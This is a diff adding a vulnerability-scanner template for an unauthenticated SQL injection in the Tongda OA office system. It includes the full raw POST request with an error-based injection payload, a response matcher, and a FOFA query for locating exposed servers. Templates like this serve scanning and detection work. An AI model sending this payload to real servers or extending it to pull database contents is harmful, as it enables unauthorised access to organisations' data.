@@ -1,0 +1,31 @@
+id: TongDa-27
+
+info:
+  name: 通达OA turn存在前台SQL注入漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA /general/document/index.php/recv/register/turn 存在前台SQL注入漏洞，攻击者无需登录可以利用漏洞获取数据库内敏感信息。
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,SQL注入漏洞
+request:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/turn HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 121
+        Connection: keep-alive
+        
+        _SERVER=&rid=EXP(~(SELECT*FROM(SELECT md5(1) FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_0
+        words: 
+          - "c4ca4238a0b923820dcc509a6f75849b"
